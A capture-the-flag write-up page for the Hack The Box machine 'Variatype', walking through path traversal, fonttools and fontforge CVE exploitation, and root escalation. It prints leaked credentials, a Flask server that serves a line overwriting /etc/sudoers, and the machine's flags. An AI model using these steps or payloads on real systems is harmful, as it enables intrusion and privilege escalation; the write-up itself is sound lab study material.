@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+   <meta charset="UTF-8">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <title>HTB - Season10 - Writeups - Variatype</title>
+   <link rel="stylesheet" href="/static/style.css">
+   <link rel="shortcut icon" href="/static/images/favicon.png" type="image/x-icon">
+</head>
+<body>
+   <canvas class="matrix-bg" id="matrix"></canvas>
+
+   <header>
+      <div class="header-content">
+         <div class="terminal-prompt">k0d14k@kali:~#</div>
+         <div class="img-text">
+               <img src="/static/images/avatar.png" width="100rem">
+               <div class="text">
+                  <h1>Luca Puzzoni<span class="typing-cursor">_</span></h1>
+                  <p class="subtitle">Softwate Security Consultant | Hacker | Full Stack Web Developer</p>
+               </div>
+         </div>
+      </div>
+   </header>
+
+   <nav>
+      <ul>
+         <li><a href="/">Home</a></li>
+         <li><a href="/#about">Whoami</a></li>
+         <li><a href="/#skills">Skills</a></li>
+         <li><a href="/#projects">Projects</a></li>
+         <li><a href="/#contact">Contacts</a></li>
+      </ul>
+   </nav>
+
+   <button id="backToTop">↑</button>
+
+    <main style="text-align: justify;">     
+        <img src="images/variatype.png" alt="500rem">   
+        <h1>Variatype - HTB Season 10</h1>
+
+        <p>
+            <b>Categories</b>: #path-traversal, #cve-2025-66034, #cve-2024-25081, #cve-2025-47273
+        </p>
+        
+        <hr>
+
+        <section id="index">
+            <h2>ls -l index</h2>
+            <div class="project">
+                <!--USED BY THE LISTER-->
+                <span id="time" hidden>26 Apr 14 01:10</span>
+            </div>
+        </section>
+
+        <section id="tcp-scan">
+            <h2>cat tcp-scan</h2>
+            
+            <div class="code">
+                PORT   STATE SERVICE REASON         VERSION <br>
+                22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0) <br>
+                | ssh-hostkey:  <br>
+                |   256 e0:b2:eb:88:e3:6a:dd:4c:db:c1:38:65:46:b5:3a:1e (ECDSA) <br>
+                | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGaryOd6/hnIT9XPtT08U3YwVShW2VnKYno4lQqs0BQ6ePwGDjLxPcQHcEiiKWd0/mvv39jxHUQAgt069vYV8ag= <br>
+                |   256 ee:d2:bb:81:4d:a2:8f:df:1c:50:bc:e1:0e:0a:d1:22 (ED25519) <br>
+                |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILtP5zMi+IdeNc7bOdDPDwFv+HWDAUakOFYbEIvNSp2z <br>
+                80/tcp open  http    syn-ack ttl 63 nginx 1.22.1 <br>
+                | http-methods:  <br>
+                |_  Supported Methods: GET HEAD POST OPTIONS <br>
+                |_http-title: Did not follow redirect to http://variatype.htb/ <br>
+                |_http-server-header: nginx/1.22.1 <br>
+                Device type: general purpose|router <br>
+                Running: Linux 4.X|5.X, MikroTik RouterOS 7.X <br>
+                OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 <br>
+                OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+            </div>
+
+            <p>
+                The first TCP port scan reveals the presence of a web page hosted by the <span class="highlight">nginx</span> web server, 
+                pointing to the domain <span class="highlight">variatype.htb</span>. I prepare my <span class="highlight">/etc/hosts</span> 
+                file with the command:
+            </p>
+            
+            <div class="code">
+                echo '10.129.8.37 variatype.htb' | sudo tee -a /etc/hosts
+            </div>
+        </section>
+
+        <section id="fuzzing">
+            <h2>cat fuzzing</h2>
+            
+            <p>
+                Fuzzing the main page does not reveal any particularly exposed folders or files. The first real finding comes during virtual host enumeration:
+            </p>
+
+            <img src="images/Pasted image 20260401194557.png" width="1000rem">
+
+            <p>I add the <span class="highlight">portal.variatype.htb</span> portal and restart directory enumeration:</p>
+
+            <img src="images/Pasted image 20260401194642.png" width="1000rem">
+
+            <p>Noticing the presence of a <span class="highlight">.git</span> folder, I launch <span class="highlight">gitdumper</span> to inspect its contents.</p>
+
+            <p>
+                Inside this repository there initially appears to be nothing, only an incomplete <span class="highlight">auth.php</span> file. 
+                After running <span class="highlight">git log</span> I notice the presence of two commits:
+            </p>
+
+            <img src="images/Pasted image 20260401201315.png" width="1000rem">
+
+            <p>
+                The first commit contains nothing of interest, but the second has an <span class="highlight">auth.php</span> file containing a set 
+                of credentials for <span class="highlight">gitbot</span> - credentials that turn out to work on the <span class="highlight">portal</span> 
+                login page.
+            </p>
+            
+            <div class="code">
+                &lt;?php <br>
+                session_start(); <br>
+                $USERS = [ <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;'gitbot' => 'G1tB0t_Acc3ss_2025!' <br>
+                ];
+            </div>
+
+            <p>
+                After logging in, I notice that the dashboard presented to us is empty, but the message displayed is fairly clear: 
+                that dashboard shows fonts generated through the first portal. I therefore use Claude to generate valid designspace 
+                and ttf files, start the font creation process and:
+            </p>
+
+            <img src="images/Pasted image 20260401201714.png" width="1000rem">
+
+            <p>
+                The download button triggers a file called <span class="highlight">download.php</span> with a parameter <span class="highlight">f</span> 
+                that specifies the filename. I try some Path Traversal and manage to exfiltrate the <span class="highlight">/etc/passwd</span> file.
+            </p>
+            
+            <img src="images/Pasted image 20260401201910.png" width="1000rem">
+        </section>
+
+        <section id="foothold">
+            <h2>cat foothold</h2>
+            <p>
+                At this point I got stuck for a while because I couldn't figure out the next step, so I went back to carefully 
+                examining the original first portal.
+            </p>
+
+            <p>Reading more carefully, I had missed a relevant piece of information on the homepage:</p>
+
+            <img src="images/Pasted image 20260401202031.png" width="1000rem">
+
+            <p>
+                They are using <span class="highlight">fonttools</span>. I search online for known issues and come across 
+                <a target="_blank" href="https://github.com/v3cn4x00/POC-CVE-2025-66034">CVE-2025-66034</a>. This CVE allows creating arbitrary PHP files inside the 
+                <span class="highlight">webroot</span> directory of the fonttools installation. The issue is that I don't know what that folder is, but 
+                by exploiting the Path Traversal vulnerability I can dump the application source code to investigate further.
+            </p>
+
+            <p>
+                The file to download is clearly `download.php` itself since, at least in theory, it should be downloading fonts generated from 
+                that very directory:
+            </p>
+            
+            <div class="code">
+                <?php <br>
+                require_once 'auth.php'; <br>
+                require_login(); <br>
+                <br>
+                $file = $_GET['f'] ?? ''; <br>
+                if (!$file) { <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;die('File parameter required.'); <br>
+                } <br>
+                <br>
+                $file = str_replace("../", "", $file); <br>
+                <br>
+                $filepath = '/var/www/portal.variatype.htb/public/files/' . $file; <br>
+                <br>
+                if (!is_file($filepath)) { <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;die('File not found.'); <br>
+                } <br>
+                <br>
+                // Force download <br>
+                header('Content-Type: application/octet-stream'); <br>
+                header('Content-Disposition: attachment; filename="' . basename($file) . '"'); <br>
+                header('Content-Length: ' . filesize($filepath)); <br>
+                <br>
+                readfile($filepath); <br>
+                exit(); <br>
+                ?> <br>
+
+            </div>
+
+            <p>Once the folder is found, the initial access is straightforward:</p>
+
+            <img src="images/Pasted image 20260401202811.png" width="1000rem">
+
+            <p>
+                I then use <span class="highlight">python3</span> to spawn a TTY shell. As shown in the screenshot above, our initial 
+                access gives us a <span class="highlight">www-data</span> shell. According to <span class="highlight">/etc/passwd</span>, 
+                the only two users with a shell are <span class="highlight">root</span> and <span class="highlight">steve</span>.
+            </p>
+
+            <p>
+                After attempting to access steve's home directory I notice I don't have the required permissions. 
+                I therefore start enumerating all of steve's files to check whether I have execution permissions on any scripts:
+            </p>
+
+            <div class="code">
+                www-data@variatype:~$ find / -user steve 2>/dev/null <br>
+                /home/steve <br>
+                /tmp/ffarchive-4576-1 <br>
+                /tmp/ffarchive-4576-1/ff-archive-table-of-contents <br>
+                /proc/4585 <br>
+                ... <br>
+                /proc/4585/ksm_stat <br>
+                /opt/process_client_submissions.bak <br>
+                www-data@variatype:~$ 
+            </div>
+
+            <p>
+                Among other things, I notice that <span class="highlight">/opt</span> contains a file with a <span class="highlight">.bak</span> extension, 
+                which is typically used for backup copies.
+            </p>
+
+            <p>
+                I dump the contents of this file and discover it is a script used to manage user uploads on the main site. 
+                This kind of file is usually triggered by either a <span class="highlight">cronjob</span> or a <span class="highlight">watch</span> 
+                it's not clear yet. Since I don't have permission to read <span class="highlight">/etc/crontab</span>, I push 
+                <span class="highlight">pspy</span> to the target machine, launch it to observe process activity, reload the previously used files, and wait.
+            </p>
+            
+            <img src="images/Pasted image 20260402115636.png" width="1000rem">
+
+            <p>
+                After a few seconds I see a file <span class="highlight">process_client_submissions.sh</span> (which should be the original copy of the .bak) 
+                being executed inside steve's home directory.
+            </p>
+
+            <p>Considering that only <span class="highlight">steve</span> can use their own home directory:</p>
+
+            <div class="code">
+                www-data@variatype:/tmp$ ls -al /home <br>
+                total 12 <br>
+                drwxr-xr-x  3 root  root  4096 Dec  5 13:59 . <br>
+                drwxr-xr-x 18 root  root  4096 Mar  9 08:29 .. <br>
+                drwx------  8 steve steve 4096 Feb 27 06:16 steve
+            </div>
+
+            <p>
+                The script must necessarily be running as either <span class="highlight">steve</span> or <span class="highlight">root</span>. 
+                The fact that the <span class="highlight">.bak</span> was made available can't be a coincidence, so I start analyzing the script 
+                to look for potential security issues:
+            </p>
+            
+            <div class="code">
+                if timeout 30 /usr/local/src/fontforge/build/bin/fontforge -lang=py -c " <br>
+                import fontforge <br>
+                import sys <br>
+                try: <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;font = fontforge.open('$file') <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;family = getattr(font, 'familyname', 'Unknown') <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;style = getattr(font, 'fontname', 'Default') <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;print(f'INFO: Loaded {family} ({style})', file=sys.stderr) <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;font.close() <br>
+                except Exception as e: <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;print(f'ERROR: Failed to process $file: {e}', file=sys.stderr) <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;sys.exit(1) <br>
+                "; then <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;log "SUCCESS: Validated $file" <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;log "WARNING: FontForge reported issues with $file" <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fi <br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mv "$file" "$PROCESSED_DIR/" 2>/dev/null || log "WARNING: Could not move $file" <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;done <br>
+                done
+            </div>
+
+            <p>
+                I notice that the <span class="highlight">process_client_submissions.sh</span> script runs this code fragment every 30 seconds 
+                by invoking the <span class="highlight">open</span> method on <span class="highlight">fontforge</span>. Researching known security 
+                issues in fontforge, I discover that certain versions are vulnerable to RCE.
+            </p>
+            
+            <div class="code">
+                www-data@variatype:/tmp$ /usr/local/src/fontforge/build/bin/fontforge --version <br>
+                Copyright (c) 2000-2025. See AUTHORS for Contributors. <br>
+                License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html> <br>
+                with many parts BSD <http://fontforge.org/license.html>. Please read LICENSE. <br>
+                Version: 20230101 <br>
+                Based on sources from 2025-12-07 11:44 UTC-D. <br>
+                Based on source from git with hash: a1dad3e81da03d5d5f3c4c1c1b9b5ca5ebcfcecf <br>
+                fontforge 20230101 <br>
+                build date: 2025-12-07 11:44 UTC <br>
+                www-data@variatype:/tmp$ 
+            </div>
+
+            <p>
+                The version is <span class="highlight">20230101</span>, which is vulnerable to 
+                <a target="_blank" href="https://github.com/InzegoSec/CVE-2024-25081_2025-47273">CVE-2024-25081</a>. This CVE allows performing lateral movement. 
+                I would only discover after executing it that the user running the script was indeed <span class="highlight">steve</span>.
+            </p>
+
+            <img src="images/Pasted image 20260402120818.png" width="1000rem">
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>cat privilege-escalation</h2>
+            
+            <div class="code">
+                steve@variatype:/tmp/ffarchive-5048-1$ cat /home/steve/user.txt&nbsp;&nbsp;<br>
+                3b3877a405a02a9b2c7d584cc08cab4a <br>
+                steve@variatype:/tmp/ffarchive-5048-1$ sudo -l <br>
+                Matching Defaults entries for steve on variatype: <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;env_reset, mail_badpass, <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;use_pty <br>
+                <br>
+                User steve may run the following commands on variatype: <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;(root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py * <br>
+                steve@variatype:/tmp/ffarchive-5048-1$&nbsp;&nbsp;<br>
+            </div>
+
+            <p>
+                After obtaining the user flag, I check whether <span class="highlight">steve</span> has any special privileges with <span class="highlight">sudo -l</span>. 
+                The user can run the script <span class="highlight">/opt/font-tools/install_validator.py</span> as sudo without a password.
+            </p>
+
+            <p>I then analyze the script:</p>
+
+            <div class="code">
+                ... <br>
+                def install_validator_plugin(plugin_url): <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;if not os.path.exists(PLUGIN_DIR): <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;os.makedirs(PLUGIN_DIR, mode=0o755) <br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;logging.info(f"Attempting to install plugin from: {plugin_url}") <br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;index = PackageIndex() <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;try: <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;downloaded_path = index.download(plugin_url, PLUGIN_DIR) <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;logging.info(f"Plugin installed at: {downloaded_path}") <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print("[+] Plugin installed successfully.") <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;except Exception as e: <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;logging.error(f"Failed to install plugin: {e}") <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(f"[-] Error: {e}") <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys.exit(1) <br>
+                ...
+            </div>
+
+            <p>
+                The <span class="highlight">install_validator_plugin</span> method downloads a plugin from a URL and places it in a <span class="highlight">PLUGIN_DIR</span> 
+                folder via the <span class="highlight">index.download</span> method of <thespan class="highlight">PackageIndex</thespan> class. A Google search 
+                reveals that this class has a Path Traversal vulnerability described in <a target="_blank" href="https://github.com/advisories/GHSA-5rjg-fvgr-3xxf">CVE-2025-47273</a>. 
+                The previously cloned repository already includes a PoC for this CVE, but I chose to do it manually by overwriting the 
+                <span class="highlight">/etc/sudoers</span> file instead of adding a known key:
+            </p>
+
+            <h3>Flask server on attacker machine:</h3>
+            
+            <div class="code">
+                from flask import Flask, Response <br>
+                <br>
+                app = Flask(__name__) <br>
+                <br>
+                @app.route("//tmp/check") <br>
+                def check(): <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;return Response("PWNED", mimetype="text/plain") <br>
+                <br>
+                @app.route("//etc/sudoers") <br>
+                def hack(): <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;return Response("steve&nbsp;&nbsp;ALL=(ALL) NOPASSWD: ALL", mimetype="text/plain") <br>
+                <br>
+                if __name__ == "__main__": <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;app.run("10.10.15.169", 9090, debug=True)
+            </div>
+
+            <h3>Victim machine scenario:</h3>
+
+            <img src="images/Pasted image 20260402125731.png" width="1000rem">
+
+        </section>
+
+        <section id="flags">
+            <h2>cat flags</h2>
+            <h3><b>User Flag:</b> 3b3877a405a02a9b2c7d584cc08cab4a</h3>
+            <h3><b>Root Flag:</b> a7b0ce8723350dd99a88dcfa3839d925</h3>
+        </section>
+    </main>
+
+
+   <footer>
+      <p>Built with GitHub Pages —— Securing the web, one bug at a time.</p>
+      <p>&copy; 2025 K0D14K</p>
+   </footer>
+
+   <script src="/static/script.js"></script>
+   <script> lister() </script>
+</body>
